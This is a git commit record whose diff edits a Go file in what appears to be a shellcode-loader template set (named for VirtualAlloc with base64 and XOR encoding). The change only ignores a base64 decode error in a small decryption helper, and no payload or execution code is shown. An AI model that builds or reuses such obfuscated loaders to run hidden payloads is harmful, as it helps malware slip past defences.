4e2654e0d9f39ba6860dbeadd8b24f22e2172deb
yutianqaq <ytian233@163.com>
2024-01-26 21:04:42 +0800

    :memo: Update Golang Templates

--- template/go/go_VirtualAlloc/base64Xor/LOCAL/go_VirtualAlloc.go
+++ template/go/go_VirtualAlloc/base64Xor/LOCAL/go_VirtualAlloc.go
@@ -26,7 +26,7 @@ func XorDecrypt(plaintext []byte, key []byte) []byte {
 
 func DecryptData(v2 string) []byte {
 	key := []byte{{{Key}}}
-	v22, err := base64.StdEncoding.DecodeString(v2)
+	v22, _ := base64.StdEncoding.DecodeString(v2)
 	v222 := XorDecrypt(v22, key)
 	return v222
 }
